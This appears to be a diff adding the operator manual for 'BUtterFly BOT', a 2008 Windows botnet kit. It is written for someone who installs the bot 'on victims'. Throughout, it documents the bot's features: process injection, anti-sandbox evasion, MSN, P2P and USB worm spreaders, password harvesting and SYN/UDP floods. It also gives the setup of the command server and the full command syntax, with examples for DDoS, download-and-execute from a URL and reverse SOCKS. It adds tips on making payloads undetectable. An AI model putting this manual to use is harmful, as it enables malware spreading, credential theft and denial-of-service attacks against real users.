@@ -1,0 +1,421 @@
+******************************************************
+	   BUtterFly BOT v1.30 EXTENDED
+		new generation bot
+******************************************************
+Developed by iserdo
+Copyright (c) 2008
+contact: iserdo@gmail.com
+------------------------------------------------------
+FOR TESTING PURPOSES ONLY! AUTHOR OF THIS SOFTWARE 
+IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED
+BY THIS SOFTWARE! USE AT YOUR OWN RISK!
+------------------------------------------------------
+
+TABLE OF CONTENTS:
+I. CONTENTS OF BFBOT PACKAGE
+II. FEATURES
+a) base
+b) spreaders
+1:MSN spreader
+2:P2P spreader
+2:USB spreader
+III. PREPARATIONS
+a) server
+b) master client
+IV. USING BOT
+V. USING MASTER-CONSOLE
+VI. USING SOCKSAPP
+VII. PROTOCOL EXPLAINED
+VIII. DOWNLOADER EXPLAINED
+IX. FIXES
+
+
+I. CONTENTS OF BFBOT PACKAGE
+
+This package contains following applications
+- bfbot server for windows and linux binary (folder server)
+- master-console application and master-dll dll (folder master)
+- bot binary (folder bot)
+- reverse socks receiver (folder socks)
+- MD5 tool for making MD5 hashes (folder tools)
+
+
+II. FEATURES
+
+a) Features of bot base
+
+1. Polymorphic code and strings
+	code related to bot functionality is encoded 
+	everytime with different key, same goes for 
+	strings
+2. Installation into hidden location
+	installs into location where it is impossible
+	to access with windows explorer
+3. Direct code injection into explorer.exe (DCI)
+	injects whole bot into remote process without
+	leaving any .dll behind
+4. Registry startup method
+	method that works on all winnt versions,
+	including limited accounts (guest)
+5. Executable file guard
+	when bot is running (injected), bot file can
+	not be deleted
+6. Process monitor
+	small code injected into another non-explorer.exe
+	process which monitors explorer.exe; if explorer
+	crashes, the bot is restarted and can reinject
+	code into explorer.exe
+7. Anti-x
+	anti vmware, virtualpc, debugger 1 & 2, anubis,
+	TE, sandbox, norman sandbox, sunbelt sandbox
+8. Own protocol
+	udp (no connections logged), acks and sequences
+	so packets are reliable transmitted, encoded traffic,
+	bitstreams, unlimited number of clients supported
+9. Download/update/remove
+10. TCP (SYN) and UDP flood
+11. Firefox 2.x, Firefox 3.x password harvesting
+12. Internet Explorer 6, Internet Explorer 7 password harvesting
+13. Reverse Socks4, Socks5, HTTP socks
+
+b) features of spreaders
+
+1:MSN spreader
+	hooks send function in msnmsgr process and hijack
+	certain message, replacing it with custom link,
+	msn process monitor (waits for msnmsgr, checks if
+	same msnmsgr process running, else restart spreader)
+2:P2P spreader
+	supports: ares, bearshare, imesh, shareaza, kazaa,
+	dcplusplus, emule, emuleplus, limewire
+	obtains sharing folder out of registry or config
+	files (100% accurate sharing folders)
+	option to autospread with names of latest warez files
+	obtained from certain warez website
+3:USB spreader
+	using windows messages to get informed when usb device
+	has been inserted; the spreader is very very fast and
+	it locks down autorun.inf file even before explorer.exe
+	can read it to launch autorun (so no other malware
+	can infect infected machine via usb spreading). the
+	autorun.inf file stays locked from reading or deleting
+	until user decides to safely remove device from the system
+
+
+
+
+III. PREPARATIONS
+
+Before installing and launching bot on victims, you
+should prepare server and master client to work for
+you. Read following to learn how to do it.
+
+a) server
+
+Server files are located in folder server. server.cfg
+is the file you should modify first. Most important
+are port, mastermd5 and visitormd5 values. For port,
+enter in any value you want between 1 and 65535
+(usually the one bot will use of course). Also don't
+forget to change mastermd5 and visitormd5. Use MD5.exe
+tool in tools folder to generate md5 hash for certain
+string; eg. if you would like to use string "iammasta"
+for logging into your server, then put in config file
+"216e19eec6e311caba33585b950e3bea" as this is the md5
+hash of string "iammasta". Do the same for visitormd5.
+After you are done, save server.cfg and you are ready
+to go with launching the server. If you use windows
+for hosting server, then simply run "server_w.exe".
+If you use *nix then first chmod server_l to executable,
+then run it. Attention: server.cfg must be in same folder
+as servers executable!
+
+b) master client
+
+There are 2 files important for master client;
+master-console.exe and master-dll.dll. Both are located in
+master folder. To run master client, open CMD, go to master
+folder and run master-console.exe. To connect to certain
+server, you need to append some parameters:
+hostip = ip/domain where to connect to 
+port = port to connect to
+code = master or visitor code you have picked when setting
+       server up
+visitor = optionally put here 1 if you are connecting as
+          visitor (do not put anything in here if you
+          want to connect as master!)
+
+After you specify these parameters, your master client will
+connect to the running server. If not, you have fucked up
+somewhere. Also don't forget about NAT. If your server is
+behind router, you need to forward UDP port which you set
+in server.cfg file.
+
+DEVELOPER NOTES:
+You can create your own master client application. Just use
+master-dll.dll. All additional needed files are in master\src
+directory. See master-dll.h file for exported functions and 
+variables you can use. Also see source of master-console 
+application for an example how to build master client. You can
+modify and compile master-console to your needs and add extra
+features.
+
+
+IV. USING BOT
+
+You can manually make poly version of bot by passing it parameters:
+1 [newbotfilename]
+
+Example: >bot.exe 1 new_bot.exe
+
+This will generate polymorphic copy of bot.
+
+It is recommended that you test bot on your pc (virtualbox) first
+to see if everything works ok. Author is not responsible if you 
+load many bots and loose them only because you have not tested it on
+your own first and reported error back to the author.
+
+How to disable poly engine?
+Open bot.exe with HEX editor. Go to offset 00014EA0h and change
+byte 01 to 00. You can reenable poly later by changing 00 to 01.
+After this is done, packers and crypters should normaly work with
+the bot.
+
+
+V. USING MASTER-CONSOLE
+
+After you have connected to server with master-console, you can
+press enter to see commands you can pass either to yourself,
+bots or to server. You can list all connected clients by using
+l command. If you want detailed list (with OS info, Wan or Lan,
+country,...) use L command. Note: when you query list, server
+will not query all bots, this is already done when bot joins.
+If you want statistics about server use command si.
+
+To get certain svar, use sg. Example: sg maxupload
+To set certain svar, use ss. Example: ss maxupload 100000
+
+When you give orders to single bot, you need to pass it in 
+following form: [order] [botip][botport] [params]
+
+Example if you want to reconnect bot with ip 127.0.0.1 and port
+1234, you would type in: ur 127.0.0.1:1234
+If you would like to start usb spreader on certain bot:
+uc 127.0.0.1:1234 u1
+
+When you give order to all bots, you use a[x] command, where x
+stands for all possible orders. Example, when you want to kill
+all bots: ak
+Or when you want to start msn spreader on all bots:
+ac m1 http://????.myhostspace.com
+
+You can give command to <n> amount of bots (useful for updating 
+large amount of bots) so you do not flood HTTP or FTP server.
+For example to update 100 bots:
+nc 100 [yourupdatecode] http://myurl.com/bot.exe
+
+If you wish to command only bots from certain country, you can
+use cc. Example to give version command only to USA bots:
+cc USA v
+Remember that country code is always 3 letters and is case sensitive!
+
+It is possible to add on join commands - command that are
+received when bot joins the server (kinda like topic @ irc).
+You can add command with ja, you can list current commands
+with jl and you can remove certain command with jr. When you
+use jr, the parameter is the number of command you want to
+remove. To get numbers of commands use jl.
+
+How to use jobs?
+To add command under x onjoin command: ja |x|command goes here
+Example: ja |1|fu1 192.168.0.1 80 100
+To query all commands under x onjoin command: jl |x|
+Example: jl |1|
+To remove certain command under x onjoin command with y id: jr |x|y
+Example: jl |1|1
+
+Bot supports following commands:
+v - version
+download [url] - download file from url to temp folder and
+                 execute it
+update [url] - download file from url, execute it and remove bot
+remove - remove bot
+m1 [url] - start msn spreader; you can put '?' in url, those
+           will be replaced with random letters for each bot
+m0 - stop msn spreader
+p <filename> - p2p spread, if filename is specified it will use
+               it to spread into p2p sharing folders, if not
+               it will try to obtain list of latest warez files
+               from certain warez site (might respond a little
+               later, so don't panic if nothing happens for few
+               seconds)
+u1 - start usb spreader
+u0 - stop usb spreader
+s1 [channel] - silent certain channel
+s0 [channel] - unsilent certain channel
+
+Some useful commands:
+add usb spreader to on join command: ja u1
+add p2p spreader to on join command (using example file.exe): 
+ja p example file.exe
+start usb spreader on all joined bots: ac u1
+p2p spread on all bots (using test file.exe): ac p test file.exe
+
+BFBOT with DDOS support:
+fu1 [ip] [port] [packets] - UDP flood IP:PORT with number of packets
+                            (0 packets for infinite ddos)
+fu0 - stop UDP flood
+ft1 [ip] [port] [packets] - TCP flood IP:PORT with number of SYN
+                            packets (0 packets for infinite ddos)
+ft0 - stop TCP flood
+
+Example to ddos 192.168.0.1 with 1000 udp packets:
+ac fu1 192.168.0.1 100 1000
+
+BFBOT with FIREFOX password harvesting:
+lf - obtain firefox passwords (if firefox installed and if there are 
+     any saved passwords)
+
+BFBOT with IE6,7 password harvesting:
+l6 - obtain Internet Explorer 5, 6 passwords
+l7 - obtain Internet Explorer 7 passwords
+
+BFBOT with socks support:
+rs1 [ip] [port] - start reverse socks and reverse connect to
+                  given ip and port
+rs0 - stop reverse socks
+
+
+VI. USING SOCKSAPP
+
+Start socksapp.exe with following parameters:
+[bot-port] [my-port] [max-bots] [use-one-only]
+
+bot-port: on which port bots connect
+my-port: on which port you connect
+max-bots: max number of bots to permit connection
+use-one-only: use one bot for all connections, else each new
+              connection uses next bot
+
+Example: socksapp.exe 11223 8080 100 0
+
+This will start reverse socks receiver and bots will be able to
+connect on port 11223, you will use 127.0.0.1:8080 to use socks.
+
+For bots to connect to your receiver with this configuration, 
+you need to give them command: rs1 yourip 11223
+
+
+VII. PROTOCOL EXPLAINED
+
+Communication protocol runs on UDP packets, so the major benefit
+is stealthness of it. TCP connections are usually logged at
+various firewalls, gateways etc, even providers log them! If you
+use IRC protocol for bots, it's easy to backtrack and locate
+you, since IRC uses TCP.
+
+But since UDP is connection-less, there are some differences if
+you are going to compare join/quit events in this protocol and
+in IRC protocol. When bot is killed (usually by system turn off),
+socket on bot's side is closed and TCP data sent across network
+to the server, that connection has been closed. IRC server can
+therefore notify you with: Connection reset by peer. But UDP
+doesn't work like that. When socket is closed, there is no data
+transfered to the server. So my protocol uses so called
+"presence-check", which is by default 2 minutes. Each bot is
+checked every 2 minutes if it is responsible or not. If a certain
+bot is non-responsible when check packet is sent, server will
+report it as timedout. Additionally to that, each packet sent 
+from server that does not get confirmation from bot will cause
+server to drop that bot and report timedout. Following these, you
+will observe following happenings (WHICH ARE NORMAL!):
+- bots will normaly never quit, only timeout
+- bots quit only when you give an order (if you see bots quit
+  without passing them any such order, then someone else is
+  doing it)
+- some bots with bad connection would constantly join/timeout;
+  that is normal and the severity depends on packet loss between
+  these bots and server
+- when you pass command to all bots, it can happen that after
+  some seconds (num retransmissions * retransmission delay)
+  some bots timeout (like 20 when you have 1k bots); these bots
+  were dead even before you passed the command, but the server
+  did not know that until you passed the command; if you would
+  not have passed it, these would timeout in 2 min time anyway
+- if the server suddenly falls into huge udp packet loss, you
+  will see massive timeouts (and massive joinings)
+- if you set command s in onjoin and other commands next, it
+  can happen that some bots talk anyway; this is caused:
+  "If two messages are sent to the same recipient, the order 
+  in which they arrive cannot be predicted."
+
+
+VIII. DOWNLOADER EXPLAINED
+
+If you get feeling like downloader isn't working properly, consider
+following possible issues:
+- webhosting not avaliable to certain bots (bots reply with FAILED)
+- bots downloaded files are cached - if you give bots same url to dl 
+  next time with different file on webhosting, bots just take file 
+  from cache (old file)
+- your stuff is not FUD
+- your stuff doesn't work under limited privileges (any malware that 
+  uses rootkits, runs as service, tries to put into sys32 dir etc,...)
+
+
+IX. FIXES
+(version 1.30)
+- added extended features
+- new poly engine with new concept and different encoding
+(version 1.29)
+- distributed packet sending that reduces server flood when giving commands
+- added domain resolution to flood
+- win xp sp1 and lower now use more sockets for flood (stronger flood)
+- added option to limit max number of users on server
+- certain config variables are now svars and you are able to change them 
+  when server is running (sleeptime, maxupload, maxclients, ojdelay)
+- optimized joining system - less CPU usage on server side with many bots
+(version 1.28)
+- added jobs (distributed onjoin commands)
+- added option to command bots by country (cc)
+- fixed newly infected now reporting only for first time connected
+- fixed bug in master-dll.dll making all bots running on vista showing as 
+  being unknown OS
+- added newly infected monitoring
+(version 1.27)
+- fixed bug in nc with sending command to all users
+- fixed bug showing wrong (negative) count of total clients and users
+(version 1.26)
+- p2p spreading - now all files with same MD5 (for better spreading)
+(version 1.25)
+- altered joining method; bots join after sys info is parsed
+- reporting some client info when client joins (permission, os, sp,..)
+- bot injecting whole .text sections instead of function by function
+  (reduced bot size for 2kb)
+(version 1.24)
+- presence check delay is not static; previous method was - pc packet
+  sent after 360 or 240 sec from last bot's response - this caused
+  all bots to have same time pc-ing and could result in server flood
+(version 1.23)
+- added server peak time (how long ago it happened)
+- added server messages reporting when peak is breached
+- added uptime in bot info query (correct calculation now)
+- added server messages reporting newly infected pcs
+  (so you can determine how fast your net is spreading)
+- added 4th parameter in message receive callback for master app
+  (contains pointer to raw data received by server)
+- presence check delay reduced from 360 to 240
+(version 1.21)
+- added onjoin support in server config file
+- bot prepared for upcoming support for linked servers
+- added option to kill/restart/command <n> amount of bots
+- fixed access violation bug in server when checking dialogs
+(version 1.20)
+- seq numbers 2 bytes big
+- seq related to dialogs
+- added incoming dialogs
+- presence check delay increased from 120 to 360
+- fixed bug with resent packets (were encoded 2 or more times)
+- added smart keepalive method; only bots behind NAT send keep alive packets
+- added si command; query server information (version, uptime, peak, etc) 
+- altered s command (can now mute/unmute certain channel)
